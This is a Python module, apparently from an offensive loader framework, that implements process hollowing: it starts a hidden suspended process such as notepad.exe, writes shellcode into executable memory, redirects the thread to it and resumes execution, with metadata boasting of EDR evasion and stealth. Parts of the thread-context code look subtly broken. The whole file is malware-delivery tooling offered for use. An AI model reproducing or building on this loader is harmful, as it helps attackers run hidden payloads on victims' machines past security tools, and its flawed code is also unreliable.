import os
import ctypes
from typing import List, Optional

from core.interfaces import BaseLoader

class ProcessHollowingLoader(BaseLoader):
    
    def __init__(self):
        self.kernel32 = ctypes.windll.kernel32
        self.ntdll = ctypes.windll.ntdll
    
    def load(self, payload: bytes, target_process: str = None, **kwargs) -> bool:
        hide_console = kwargs.get("hide_console", True)
        replace_pe = kwargs.get("replace_pe", False)
        
        if not target_process:
            target_process = "notepad.exe"
        
        is_pe = self._is_pe_file(payload)
        
        if is_pe and replace_pe:
            return self._process_hollowing_pe(payload, target_process, hide_console)
        else:
            return self._process_hollowing_shellcode(payload, target_process, hide_console)
    
    def _is_pe_file(self, data: bytes) -> bool:
        if len(data) < 2:
            return False
        
        return data[0:2] == b'MZ'
    
    def _process_hollowing_shellcode(self, shellcode: bytes, target_process: str, hide_console: bool) -> bool:
        CREATE_SUSPENDED = 0x4
        CREATE_NO_WINDOW = 0x08000000
        PROCESS_ALL_ACCESS = 0x1F0FFF
        MEM_COMMIT = 0x1000
        MEM_RESERVE = 0x2000
        PAGE_EXECUTE_READWRITE = 0x40
        
        try:
            class STARTUPINFO(ctypes.Structure):
                _fields_ = [
                    ("cb", ctypes.c_ulong),
                    ("lpReserved", ctypes.c_void_p),
                    ("lpDesktop", ctypes.c_void_p),
                    ("lpTitle", ctypes.c_void_p),
                    ("dwX", ctypes.c_ulong),
                    ("dwY", ctypes.c_ulong),
                    ("dwXSize", ctypes.c_ulong),
                    ("dwYSize", ctypes.c_ulong),
                    ("dwXCountChars", ctypes.c_ulong),
                    ("dwYCountChars", ctypes.c_ulong),
                    ("dwFillAttribute", ctypes.c_ulong),
                    ("dwFlags", ctypes.c_ulong),
                    ("wShowWindow", ctypes.c_ushort),
                    ("cbReserved2", ctypes.c_ushort),
                    ("lpReserved2", ctypes.c_void_p),
                    ("hStdInput", ctypes.c_void_p),
                    ("hStdOutput", ctypes.c_void_p),
                    ("hStdError", ctypes.c_void_p)
                ]
            
            class PROCESS_INFORMATION(ctypes.Structure):
                _fields_ = [
                    ("hProcess", ctypes.c_void_p),
                    ("hThread", ctypes.c_void_p),
                    ("dwProcessId", ctypes.c_ulong),
                    ("dwThreadId", ctypes.c_ulong)
                ]
            
            startup_info = STARTUPINFO()
            startup_info.cb = ctypes.sizeof(STARTUPINFO)
            startup_info.dwFlags = 1
            startup_info.wShowWindow = 0
            
            process_info = PROCESS_INFORMATION()
            
            creation_flags = CREATE_SUSPENDED
            if hide_console:
                creation_flags |= CREATE_NO_WINDOW
            
            created = self.kernel32.CreateProcessW(
                None,
                target_process,
                None,
                None,
                False,
                creation_flags,
                None,
                None,
                ctypes.byref(startup_info),
                ctypes.byref(process_info)
            )
            
            if not created:
                print(f"Ошибка при создании процесса: {ctypes.GetLastError()}")
                return False
            
            print(f"Создан процесс {target_process} с PID {process_info.dwProcessId}")
            
            process_handle = process_info.hProcess
            thread_handle = process_info.hThread
            
            # Выделение памяти в целевом процессе
            remote_memory = self.kernel32.VirtualAllocEx(
                process_handle,
                None,
                len(shellcode),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
            )
            
            if not remote_memory:
                print(f"Ошибка при выделении памяти в процессе: {ctypes.GetLastError()}")
                self.kernel32.TerminateProcess(process_handle, 0)
                return False
            
            # Запись шелл-кода в память процесса
            bytes_written = ctypes.c_ulong(0)
            
            written = self.kernel32.WriteProcessMemory(
                process_handle,
                remote_memory,
                shellcode,
                len(shellcode),
                ctypes.byref(bytes_written)
            )
            
            if not written or bytes_written.value != len(shellcode):
                print(f"Ошибка при записи шелл-кода в память процесса: {ctypes.GetLastError()}")
                self.kernel32.TerminateProcess(process_handle, 0)
                return False
            
            # Получение информации о главном потоке
            context = ctypes.create_string_buffer(1024)
            context_size = ctypes.sizeof(context)
            
            # Получить контекст текущего потока
            if hasattr(self.ntdll, "NtGetContextThread"):
                result = self.ntdll.NtGetContextThread(
                    thread_handle,
                    ctypes.byref(context)
                )
                
                if result != 0:
                    print(f"Ошибка при получении контекста потока: {result}")
                    self.kernel32.TerminateProcess(process_handle, 0)
                    return False
                
                # Изменение EIP/RIP на адрес шелл-кода
                # Этот код зависит от архитектуры (x86/x64)
                is_x64 = ctypes.sizeof(ctypes.c_void_p) == 8
                
                if is_x64:
                    # x64: RIP находится в смещении 168
                    rip_offset = 168
                    ctypes.memmove(context[rip_offset:rip_offset+8], ctypes.addressof(remote_memory), 8)
                else:
                    # x86: EIP находится в смещении 184
                    eip_offset = 184
                    ctypes.memmove(context[eip_offset:eip_offset+4], ctypes.addressof(remote_memory), 4)
                
                # Установка нового контекста
                if hasattr(self.ntdll, "NtSetContextThread"):
                    result = self.ntdll.NtSetContextThread(
                        thread_handle,
                        ctypes.byref(context)
                    )
                    
                    if result != 0:
                        print(f"Ошибка при установке контекста потока: {result}")
                        self.kernel32.TerminateProcess(process_handle, 0)
                        return False
            
            # Возобновление выполнения потока
            if self.kernel32.ResumeThread(thread_handle) == -1:
                print(f"Ошибка при возобновлении потока: {ctypes.GetLastError()}")
                self.kernel32.TerminateProcess(process_handle, 0)
                return False
            
            print(f"Process hollowing успешно выполнен для {target_process}")
            
            self.kernel32.CloseHandle(thread_handle)
            self.kernel32.CloseHandle(process_handle)
            
            return True
        
        except Exception as e:
            print(f"Произошла ошибка при Process Hollowing: {str(e)}")
            return False
    
    def _process_hollowing_pe(self, pe_data: bytes, target_process: str, hide_console: bool) -> bool:
        print("Метод замены целого PE-файла еще не реализован")
        return False
    
    def supported_platforms(self) -> List[str]:
        return ["windows"]
    
    def get_technique_details(self) -> dict:
        return {
            "name": "Process Hollowing",
            "description": "Техника внедрения кода в приостановленный процесс",
            "stealth_level": "Medium",
            "detection_difficulty": "Medium",
            "privilege_required": "Low",
            "compatibility": {
                "windows_versions": ["7", "8", "10", "11"],
                "architectures": ["x86", "x64"],
                "edr_evasion": True
            }
        }
    
    def supports_multi_stage(self) -> bool:
        return True
    
    def get_evasion_capabilities(self) -> set:
        return {
            "process_injection",
            "thread_manipulation"
        }